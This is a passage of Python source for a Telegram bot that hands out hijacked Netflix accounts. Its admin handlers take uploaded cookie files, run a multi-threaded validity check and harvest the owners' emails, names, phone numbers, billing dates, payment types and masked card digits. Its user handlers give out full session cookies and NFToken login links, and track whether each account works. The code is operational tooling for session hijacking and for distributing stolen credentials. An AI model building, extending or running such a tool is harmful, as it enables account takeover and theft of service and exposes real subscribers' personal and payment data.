│ 📦 Total Available: <b>{stats.get('total', 0)}</b>
{plan_display}└─────────────────────
⚙️ <b>YOUR STATS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{user_data.working_reports}</b>
│ ❌ Not Working: <b>{user_data.notworking_reports}</b>
│ 📦 Accounts Used: <b>{user_data.accounts_used}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{user_data.warnings}/3</b>
└─────────────────────
⏳ Cooldown: <b>{WORKING_COOLDOWN_MINUTES} min</b>
━━━━━━━━━━━━━━━━━━━━━
🔽 <b>SELECT AN OPTION BELOW</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
            await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            await self._send_message(update, "❌ An error occurred. Please try again later.")
    
    async def get_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            if user.is_banned:
                await self._send_message(update, "🚫 You are banned from using this bot.")
                return
            
            subbed, ch_buttons = await self._check_force_sub(context.bot, user_id)
            if not subbed:
                keyboard = [[btn] for btn in ch_buttons]
                keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
                await self._send_message(
                    update,
                    "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                return
            
            can_get, msg = self._can_get_account(user)
            if not can_get:
                keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
                await self._send_message(update, f"⚠️ {msg}", reply_markup=InlineKeyboardMarkup(keyboard))
                return
            
            account = self.account_repo.assign(user_id)
            if not account:
                keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
                await self._send_message(update, "❌ No available accounts in stock. Please check back later!", reply_markup=InlineKeyboardMarkup(keyboard))
                return
            
            cookie_full = safe_str(account.cookies, 'No cookies available')
            if len(cookie_full) > 3500:
                cookie_display = cookie_full[:3500] + "\n... (cookie truncated)"
            else:
                cookie_display = cookie_full
            
            token = safe_str(account.nftoken)
            nft_expiry = safe_str(account.nftoken_expiry)
            
            text = f"""🎉 <b>ACCOUNT ASSIGNED!</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>{html_escape(account.email)}</code>
👤 <b>Name:</b> {html_escape(account.account_name)}
📱 <b>Phone:</b> {html_escape(account.phone, 'Not provided')}
🌍 <b>Country:</b> {html_escape(account.country)}
📦 <b>Plan:</b> {html_escape(account.plan)}
🛡️ <b>Status:</b> {html_escape(account.membership_status, 'Active')}
📺 <b>Streams:</b> {account.streams}
🎞️ <b>Quality:</b> {html_escape(account.quality, 'HD')}
💰 <b>Price:</b> {html_escape(account.price, 'N/A')}
🗓️ <b>Billing:</b> {html_escape(account.billing_date)}
👥 <b>Extra Member:</b> {'✅ Yes' if account.extra_member else '❌ No'}
🎭 <b>Profiles:</b> {html_escape(account.profiles, 'None')}
🆔 <b>GUID:</b> <code>{html_escape(account.user_guid)}</code>
━━━━━━━━━━━━━━━━━━━━━
🍪 <b>Cookie:</b>
<code>{html_escape(cookie_display)}</code>
━━━━━━━━━━━━━━━━━━━━━
"""
            if token and len(token) > 10:
                text += f"⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n\n"
            
            text += """📝 <b>INSTRUCTIONS:</b>
1️⃣ Click a login link below or use Cookie Editor
2️⃣ Test the account working status
3️⃣ Report Working or Not Working below

👨‍💻 <b>Developer:</b> @Senzo268
"""
            
            keyboard = []
            if token and len(token) > 10:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                    InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                    InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
                ])
                keyboard.append([
                    InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                ])
            
            keyboard.append([
                InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account.id}"),
                InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account.id}")
            ])
            keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
            
            await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            await self._send_message(update, "❌ Error getting account. Please try again.")
    
    async def working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            if user.is_banned:
                await self._send_message(update, "🚫 You are banned from using this bot.")
                return
            if user.pending_report:
                await self._send_message(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                return
            
            data = update.callback_query.data if update.callback_query else ""
            account_id = None
            if data.startswith("report_working_"):
                account_id = int(data.split("_")[2])
            else:
                assigned = self.account_repo.get_assigned(user_id)
                if assigned:
                    account_id = assigned.id
            
            if not account_id:
                await self._send_message(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
                return
            
            self.db.execute_meta('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'working'
                WHERE user_id = ?
            ''', (account_id, user_id))
            self.db.commit_meta()
            
            await self._send_message(
                update,
                "✅ <b>Report Type: WORKING</b>\n\n"
                "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268"
            )
        except Exception:
            await self._send_message(update, "❌ Error starting report. Please try again.")
    
    async def notworking_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            if user.is_banned:
                await self._send_message(update, "🚫 You are banned from using this bot.")
                return
            if user.pending_report:
                await self._send_message(update, "⚠️ You already have a pending report! Please upload a screenshot first.")
                return
            
            data = update.callback_query.data if update.callback_query else ""
            account_id = None
            if data.startswith("report_notworking_"):
                account_id = int(data.split("_")[2])
            else:
                assigned = self.account_repo.get_assigned(user_id)
                if assigned:
                    account_id = assigned.id
            
            if not account_id:
                await self._send_message(update, "⚠️ No active assigned account found. Please click 'Get Account'.")
                return
            
            self.db.execute_meta('''
                UPDATE users 
                SET pending_report = 1, pending_report_account_id = ?, pending_report_type = 'notworking'
                WHERE user_id = ?
            ''', (account_id, user_id))
            self.db.commit_meta()
            
            await self._send_message(
                update,
                "❌ <b>Report Type: NOT WORKING</b>\n\n"
                "📸 <b>Please upload a screenshot proof now!</b>\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268"
            )
        except Exception:
            await self._send_message(update, "❌ Error starting report. Please try again.")
    
    async def handle_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            if user.is_banned:
                await update.message.reply_text("🚫 You are banned from using this bot.")
                return
            if not update.message.photo:
                await update.message.reply_text("❌ Please upload an image/screenshot proof.")
                return
            
            file_id = update.message.photo[-1].file_id
            
            if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
                await self._handle_broadcast_photo(update, context, file_id)
                return
            
            if not user.pending_report:
                await update.message.reply_text("❌ You do not have an active pending report.")
                return
            
            account_id = user.pending_report_account_id
            report_type = user.pending_report_type
            
            report_id = self.report_repo.create(user_id, account_id, report_type, file_id)
            if not report_id:
                await update.message.reply_text("❌ Failed to save report in database.")
                return
            
            await update.message.reply_text(
                f"✅ <b>Report Submitted Successfully!</b>\n\n"
                f"📋 <b>Report ID:</b> #{report_id}\n"
                f"🎯 <b>Status:</b> {report_type.upper()}\n\n"
                f"Thank you! Your report has been submitted to admins for review.\n"
                f"👨‍💻 <b>Developer:</b> @Senzo268",
                parse_mode=ParseMode.HTML
            )
            
            if report_type == "working":
                await self._send_working_to_channel(context.bot, report_id, user_id, account_id, file_id)
            else:
                await self._send_notworking_to_channel(context.bot, report_id, user_id, account_id, file_id)
            
            self.account_repo.release(account_id)
        except Exception:
            await update.message.reply_text("❌ Error processing your screenshot. Please try again.")
    
    async def my_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_assigned(user_id)
            
            text = f"""📊 <b>YOUR ACCOUNT & STATS SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {html_escape(user.first_name)}
🆔 <b>ID:</b> <code>{user_id}</code>
📅 <b>Joined:</b> {html_escape(user.joined_at)}
━━━━━━━━━━━━━━━━━━━━━
📈 <b>STATISTICS</b>
┌─────────────────────
│ ✅ Working Reports: <b>{user.working_reports}</b>
│ ❌ Not Working: <b>{user.notworking_reports}</b>
│ 📦 Accounts Used: <b>{user.accounts_used}/{MAX_ACCOUNTS_PER_USER}</b>
│ ⚠️ Warnings: <b>{user.warnings}/3</b>
└─────────────────────
🔑 <b>CURRENT ASSIGNED ACCOUNT:</b>
"""
            if account:
                text += f"""┌─────────────────────
│ 📧 <code>{html_escape(account.email)}</code>
│ 🌍 Country: {html_escape(account.country)}
│ 📦 Plan: {html_escape(account.plan)}
│ 📺 Streams: {account.streams}
└─────────────────────
"""
            else:
                text += "❌ None assigned currently\n"
            
            text += f"\n⏳ <b>Cooldown Period:</b> {WORKING_COOLDOWN_MINUTES} min"
            text += "\n\n👨‍💻 <b>Developer:</b> @Senzo268"
            keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]]
            await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            await self._send_message(update, "❌ Error loading status. Please try again.")
    
    async def contact_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            context.user_data["waiting_for_message"] = True
            keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="back_menu")]]
            await self._send_message(
                update,
                "📝 <b>CONTACT ADMIN</b>\n\nPlease type and send your message below. The admin team will reply to you directly!\n\n👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception:
            pass
    
    async def back_to_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            context.user_data.clear()
            await self.start(update, context)
        except Exception:
            pass
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            stats = self.account_repo.get_total()
            users = self.user_repo.get_all()
            plan_display = ""
            for plan, count in stats.get('plans', {}).items():
                emoji = {"premium": "👑", "standard": "⭐", "basic": "🎯", "mobile": "📱"}.get(plan.lower(), "📦")
                plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
            if not plan_display:
                plan_display = "│ No accounts available\n"
            
            text = f"""📊 <b>PUBLIC BOT METRICS</b>
━━━━━━━━━━━━━━━━━━━━━
📦 <b>Total Available Stock:</b> <b>{stats.get('total', 0)}</b>
{plan_display}
👥 <b>Registered Users:</b> <b>{len(users)}</b>
⏳ <b>Cooldown:</b> {WORKING_COOLDOWN_MINUTES} min
👨‍💻 <b>Developer:</b> @Senzo268
"""
            keyboard = [
                [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
            ]
            await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            pass
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self._send_message(update, "⛔ Not authorized!")
                return
            
            context.user_data.clear()
            stats = self.account_repo.get_total()
            banned = self.user_repo.get_banned()
            pending_reps = self.report_repo.get_pending()
            users = self.user_repo.get_all()
            
            keyboard = [
                [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload"), InlineKeyboardButton("📦 Manage Stock", callback_data="admin_stock_mgr")],
                [InlineKeyboardButton("👁️ View Reports", callback_data="admin_reports"), InlineKeyboardButton("👥 Manage Users", callback_data="admin_users")],
                [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("⚙️ Channels", callback_data="admin_channels")],
                [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs"), InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
                [InlineKeyboardButton("🚫 Banned Users", callback_data="admin_banned"), InlineKeyboardButton("🔍 Search User", callback_data="admin_user_search")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
            ]
            
            text = f"""⚙️ <b>ADMIN CONTROL PANEL</b>
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>SYSTEM STATUS</b>
┌─────────────────────
│ Status: <b>🟢 ONLINE</b>
│ Users DB: <b>{html_escape(self.db.meta_backend())}</b>
│ Accounts DB: <b>SQLite</b>
│ Total Users: <b>{len(users)}</b>
└─────────────────────
📊 <b>OVERVIEW METRICS</b>
┌─────────────────────
│ 📦 Total Available: <b>{stats.get('total', 0)}</b>
│ 📋 Pending Reports: <b>{len(pending_reps)}</b>
│ 🚫 Banned Users: <b>{len(banned)}</b>
└─────────────────────
🔽 <b>SELECT ADMIN ACTION:</b>
👨‍💻 <b>Developer:</b> @Senzo268
"""
            await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception:
            pass
    
    async def admin_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await self._send_message(update, "⛔ Not authorized!")
                return
            
            keyboard = [[InlineKeyboardButton("🔙 Cancel / Back", callback_data="admin_panel")]]
            await self._send_message(
                update,
                f"📤 <b>UPLOAD STOCK FILE</b>\n\n"
                "Please send a <b>.txt</b>, <b>.json</b>, or <b>.zip</b> file containing Netflix cookie credentials.\n\n"
                f"⚡ <i>Advanced multi-format extraction with {MAX_CHECK_THREADS} threads!</i>\n"
                "📋 Supports: JSON, Netscape, Raw regex extraction\n"
                "🔄 Auto-detects multiple cookie bundles per file\n"
                "📊 Includes: Plan detection, profiles, payment info, NFToken\n"
                "🧹 <b>NEW:</b> Auto-cleans corrupted cookies, URL-encoded values, and extracts from ANY format\n"
                "✅ <b>FIXED:</b> Now extracts from emoji-formatted files (📧 EMAIL:, 🍪 COOKIE:, etc.)\n\n"
                "👨‍💻 <b>Developer:</b> @Senzo268",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            context.user_data["waiting_for_upload"] = True
        except Exception:
            pass
    
    async def handle_file_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user_id = update.effective_user.id
            if not is_admin(user_id):
                await update.message.reply_text("⛔ Not authorized!")
                return
            if not context.user_data.get("waiting_for_upload"):
                return
            
            document = update.message.document
            if not document:
                await update.message.reply_text("❌ Please send a valid document file (.txt, .json, .zip).")
                return
            
            file_name = document.file_name
            if not file_name.lower().endswith(('.txt', '.json', '.zip', '.netscape', '.cookies')):
                await update.message.reply_text("❌ Supported formats are .txt, .json, .zip, .netscape, .cookies")
                return
            
            status_msg = await update.message.reply_text(f"⏳ Processing <b>{html_escape(file_name)}</b> with advanced extraction...", parse_mode=ParseMode.HTML)
            
            file = await context.bot.get_file(document.file_id)
            file_bytes = await file.download_as_bytearray()
            
            cookie_bundles = []
            
            if file_name.lower().endswith('.zip'):
                try:
                    with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
                        for zip_info in zf.infolist():
                            if not zip_info.is_dir() and zip_info.filename.lower().endswith(('.txt', '.json', '.netscape', '.cookies')):
                                try:
                                    content_bytes = zf.read(zip_info.filename)
                                    text_content = content_bytes.decode('utf-8', errors='ignore')
                                    bundles = NetflixService.extract_cookie_bundles(text_content)
                                    cookie_bundles.extend(bundles)
                                except Exception:
                                    pass
                except Exception:
                    await status_msg.edit_text("❌ Failed to parse ZIP file content.")
                    return
            else:
                text_content = file_bytes.decode('utf-8', errors='ignore')
                cookie_bundles = NetflixService.extract_cookie_bundles(text_content)
            
            if not cookie_bundles:
                await status_msg.edit_text(
                    "❌ No valid Netflix cookie pairs found in uploaded file.\n\n"
                    "💡 Try:\n"
                    "• Ensure file contains NetflixId cookies\n"
                    "• Try Netscape or JSON format\n"
                    "• Check if cookies are from active accounts"
                )
                context.user_data["waiting_for_upload"] = False
                return
            
            total = len(cookie_bundles)
            await status_msg.edit_text(
                f"🔄 Found <b>{total}</b> cookie bundles. Starting multi-threaded check with {MAX_CHECK_THREADS} threads...",
                parse_mode=ParseMode.HTML
            )
            
            valid = 0
            accounts = []
            account_lock = threading.Lock()
            processed = 0
            
            def check_bundle(bundle):
                cookies_dict = bundle.get("cookies", {})
                return NetflixService.check_account(cookies_dict)

            loop = asyncio.get_running_loop()

            with ThreadPoolExecutor(max_workers=MAX_CHECK_THREADS) as executor:
                async def run_check(bundle):
                    result = await loop.run_in_executor(executor, check_bundle, bundle)
                    return bundle, result

                tasks = [run_check(bundle) for bundle in cookie_bundles]
                for future in asyncio.as_completed(tasks):
                    processed += 1
                    try:
                        bundle, result = await future
                    except Exception:
                        continue

                    if result.get("valid"):
                        info = result.get("info", {})
                        bundle_info = bundle.get("info", {})
                        if bundle_info:
                            info.update(bundle_info)
                        
                        cookies_dict = bundle.get("cookies", {})
                        cookie_text = NetflixService.get_cookie_text(cookies_dict)
                        nftoken = result.get("nftoken") or cookies_dict.get("nftoken")
                        nftoken_expiry = result.get("nftoken_expiry") or cookies_dict.get("nftoken_expiry")

                        with account_lock:
                            accounts.append({
                                "email": safe_str(info.get("email") or cookies_dict.get("email")),
                                "country": safe_str(info.get("countryOfSignup") or cookies_dict.get("country")),
                                "plan": safe_str(info.get("localizedPlanName") or cookies_dict.get("plan")),
                                "plan_key": result.get("plan_key", "unknown"),
                                "plan_label": result.get("plan_label", "Unknown"),
                                "cookies": cookie_text,
                                "nftoken": safe_str(nftoken),
                                "nftoken_expiry": safe_str(nftoken_expiry),
                                "source_file": file_name,
                                "account_name": safe_str(info.get("accountOwnerName")),
                                "streams": safe_int(info.get("maxStreams")),
                                "quality": safe_str(info.get("videoQuality")),
                                "price": safe_str(info.get("planPrice")),
                                "billing_date": format_display_date(info.get("nextBillingDate")),
                                "member_since": format_member_since(info.get("memberSince")),
                                "payment_method": safe_str(info.get("paymentMethodType")),
                                "card_last4": safe_str(info.get("maskedCard")),
                                "phone": normalize_phone_number(info.get("phoneNumber") or cookies_dict.get("phone")),
                                "extra_member": safe_bool(info.get("isExtraMemberAccount")),
                                "membership_status": safe_str(info.get("membershipStatus") or cookies_dict.get("membershipStatus")),
                                "email_verified": safe_bool(info.get("emailVerified")),
                                "profiles": safe_str(info.get("profiles")),
                                "user_guid": safe_str(info.get("userGuid")),
                                "on_hold": result.get("on_hold", False),
                            })
                            valid += 1

                    if processed % 5 == 0 or processed == total:
                        try:
                            await status_msg.edit_text(
                                f"🔄 Progress: <b>{processed}/{total}</b> | ✅ Valid: <b>{valid}</b> | 💾 Found: <b>{len(accounts)}</b>",
                                parse_mode=ParseMode.HTML
                            )
                        except Exception:
                            pass
            
            if accounts:
                saved = self.account_repo.save_batch(accounts)
                self.stats_repo.log_stock(user_id, file_name, total, saved)
                stats = self.account_repo.get_total()
                plan_breakdown = "\n".join([f"   ▫️ {plan}: {count}" for plan, count in stats.get('plans', {}).items()])
                await status_msg.edit_text(
                    f"✅ <b>STOCK UPLOAD COMPLETE!</b>\n\n"
                    f"📁 <b>File:</b> {html_escape(file_name)}\n"
                    f"🔍 <b>Bundles Found:</b> {total}\n"
                    f"✅ <b>Valid Accounts:</b> {valid}\n"
                    f"💾 <b>Saved to DB:</b> {saved}\n"
                    f"📊 <b>Available Now:</b> {stats.get('total', 0)}\n"
                    f"📋 <b>Plan Breakdown:</b>\n{plan_breakdown if plan_breakdown else '   No plans'}\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            else:
                self.stats_repo.log_stock(user_id, file_name, total, 0)
                await status_msg.edit_text(
                    f"❌ <b>NO VALID ACTIVE ACCOUNTS FOUND!</b>\n\n"
                    f"📁 <b>File:</b> {html_escape(file_name)}\n"
                    f"🔍 <b>Bundles Checked:</b> {total}\n\n"
                    f"💡 Try:\n"
                    f"• Ensure cookies contain NetflixId\n"
                    f"• Check if cookies are from active accounts\n"
                    f"• Try different format (JSON, Netscape)\n"
                    f"• Some accounts may be on hold or expired\n\n"
                    f"👨‍💻 <b>Developer:</b> @Senzo268",
                    parse_mode=ParseMode.HTML
                )
            
            context.user_data["waiting_for_upload"] = False
        except Exception as e:
            logger.error(f"handle_file_upload error: {e}")
            context.user_data["waiting_for_upload"] = False
            await update.message.reply_text("❌ Error processing file. Please try again.")
    
    async def _send_working_to_channel(self, bot, report_id: int, user_id: int, account_id: int, file_id: str):
        if not REPORT_CHANNEL_ID:
            return
        try:
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_by_id(account_id)
            email = html_escape(account.email if account else "Unknown")
            caption = (
                f"✅ <b>WORKING REPORT</b> #{report_id}\n"
                f"👤 User: @{html_escape(user.username)} (<code>{user_id}</code>)\n"
                f"📧 Account: <code>{email}</code>\n"
            )
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}")],
                [
                    InlineKeyboardButton("🚫 Ban", callback_data=f"ban_user_{user_id}_{report_id}"),
                    InlineKeyboardButton("⚠️ Warn", callback_data=f"warn_user_{user_id}_{report_id}"),
                ],
                [InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}")],
            ])
            msg = await bot.send_photo(
                chat_id=REPORT_CHANNEL_ID,
                photo=file_id,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
            )
            self.db.execute_meta(
                "UPDATE reports SET channel_post_id = ? WHERE id = ?",
                (msg.message_id, report_id),
            )
            self.db.commit_meta()
        except Exception:
            pass

    async def _send_notworking_to_channel(self, bot, report_id: int, user_id: int, account_id: int, file_id: str):
        if not REPORT_CHANNEL_ID:
            return
        try:
            user = self.user_repo.get(user_id)
            account = self.account_repo.get_by_id(account_id)
            email = html_escape(account.email if account else "Unknown")
            self.db.execute_sqlite(
                "UPDATE accounts SET is_working = 0, status = 'available' WHERE id = ?",
                (account_id,),
            )
            self.db.commit_sqlite()
            caption = (
                f"❌ <b>NOT WORKING REPORT</b> #{report_id}\n"
                f"👤 User: @{html_escape(user.username)} (<code>{user_id}</code>)\n"
                f"📧 Account: <code>{email}</code>\n"
            )
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🚫 Ban", callback_data=f"ban_user_{user_id}_{report_id}"),
                    InlineKeyboardButton("⚠️ Warn", callback_data=f"warn_user_{user_id}_{report_id}"),
                ],
                [InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}")],
            ])
            msg = await bot.send_photo(
                chat_id=REPORT_CHANNEL_ID,
                photo=file_id,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
            )
            self.db.execute_meta(
                "UPDATE reports SET channel_post_id = ? WHERE id = ?",
                (msg.message_id, report_id),
            )
            self.db.commit_meta()
        except Exception:
            pass

    async def _handle_broadcast_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE, file_id: str):
        user_id = update.effective_user.id
        caption = context.user_data.get("broadcast_caption", "")
        context.user_data.pop("waiting_for_broadcast", None)
        context.user_data.pop("broadcast_caption", None)
        users = self.user_repo.get_all()
        sent, failed = 0, 0
        status = await update.message.reply_text(f"📢 Broadcasting photo to {len(users)} users...")
        for u in users:
            if u.is_banned:
                continue
            try:
                await context.bot.send_photo(u.user_id, photo=file_id, caption=caption or None)
                sent += 1
            except Exception:
                failed += 1
        await status.edit_text(f"✅ Broadcast done. Sent: {sent}, Failed: {failed}")

    async def admin_stock_mgr(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        plan_filter = None
        data = update.callback_query.data if update.callback_query else ""
        if data.startswith("sm_filter_"):
            plan_filter = data.replace("sm_filter_", "")
            if plan_filter == "all":
                plan_filter = None
        accounts = self.account_repo.get_available(plan_filter)
        stats = self.account_repo.get_total()
        lines = ""
        for acc in accounts[:15]:
            lines += f"• #{acc.id} {html_escape(acc.email)} ({html_escape(acc.plan_key)})\n"
        if len(accounts) > 15:
            lines += f"... and {len(accounts) - 15} more\n"
        if not lines:
            lines = "No available accounts.\n"
        keyboard = [
            [
                InlineKeyboardButton("👑 Premium", callback_data="sm_filter_premium"),
                InlineKeyboardButton("⭐ Standard", callback_data="sm_filter_standard"),
            ],
            [
                InlineKeyboardButton("🎯 Basic", callback_data="sm_filter_basic"),
                InlineKeyboardButton("📱 Mobile", callback_data="sm_filter_mobile"),
            ],
            [InlineKeyboardButton("📦 All Plans", callback_data="sm_filter_all")],
            [InlineKeyboardButton("🗑️ Clear All Stock", callback_data="clear_stock_all")],
            [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")],
        ]
        filter_label = plan_filter or "all"
        text = (
            f"📦 <b>STOCK MANAGER</b> ({html_escape(filter_label)})\n"
            f"Total available: <b>{stats.get('total', 0)}</b>\n\n{lines}"
        )
        await self._send_message(update, text, reply_markup=InlineKeyboardMarkup(keyboard))

    async def delete_account_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        data = update.callback_query.data if update.callback_query else ""
        if data.startswith("del_acc_"):
            acc_id = int(data.split("_")[-1])
            self.account_repo.delete(acc_id)
            await self._send_message(update, f"🗑️ Deleted account #{acc_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Stock", callback_data="admin_stock_mgr")]]))
            return
        if data.startswith("clear_stock_"):
            plan = data.replace("clear_stock_", "")
            plan_filter = None if plan == "all" else plan
            removed = self.account_repo.clear_all(plan_filter)
            await self._send_message(
                update,
                f"🗑️ Cleared <b>{removed}</b> account(s).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Stock", callback_data="admin_stock_mgr")]]),
            )

    async def admin_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        users = self.user_repo.get_all()[:20]
        lines = ""
        keyboard = []
        for u in users:
            lines += f"• {html_escape(u.first_name or u.username)} (<code>{u.user_id}</code>) — used {u.accounts_used}\n"
            keyboard.append([InlineKeyboardButton(f"👤 {u.user_id}", callback_data=f"manage_user_{u.user_id}")])
        keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
        await self._send_message(
            update,
            f"👥 <b>USERS</b> (showing {len(users)})\n\n{lines or 'No users yet.'}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    async def manage_user_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        data = update.callback_query.data if update.callback_query else ""
        target_id = int(data.split("_")[-1])
        user = self.user_repo.get(target_id)
        text = (
            f"👤 <b>USER</b> <code>{target_id}</code>\n"
            f"Name: {html_escape(user.first_name)}\n"
            f"Username: @{html_escape(user.username)}\n"
            f"Banned: {'Yes' if user.is_banned else 'No'}\n"
            f"Warnings: {user.warnings}/3\n"
            f"Accounts used: {user.accounts_used}\n"
            f"Reports: ✅ {user.working_reports} / ❌ {user.notworking_reports}\n"
        )
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🚫 Ban", callback_data=f"admin_ban_{target_id}"),
                InlineKeyboardButton("⚠️ Warn", callback_data=f"admin_warn_{target_id}"),
            ],
            [InlineKeyboardButton("🔄 Reset Stats", callback_data=f"reset_user_{target_id}")],
            [InlineKeyboardButton("🔙 Users", callback_data="admin_users")],
        ])
        await self._send_message(update, text, reply_markup=keyboard)

    async def admin_user_search_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        context.user_data["waiting_for_user_search"] = True
        await self._send_message(
            update,
            "🔍 Send a user ID or @username to search.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]),
        )

    async def admin_banned(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        banned = self.user_repo.get_banned()
        keyboard = []
        lines = ""
        for row in banned[:20]:
            uid, username, first_name = row[0], row[1], row[2]
            lines += f"• {html_escape(first_name or username)} (<code>{uid}</code>)\n"
            keyboard.append([InlineKeyboardButton(f"✅ Unban {uid}", callback_data=f"unban_user_{uid}")])
        keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
        await self._send_message(
            update,
            f"🚫 <b>BANNED USERS</b>\n\n{lines or 'None.'}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    async def unban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        uid = int(update.callback_query.data.split("_")[-1])
        self.user_repo.unban(uid)
        await self._send_message(update, f"✅ User <code>{uid}</code> unbanned.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Banned", callback_data="admin_banned")]]))

    async def admin_user_actions_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
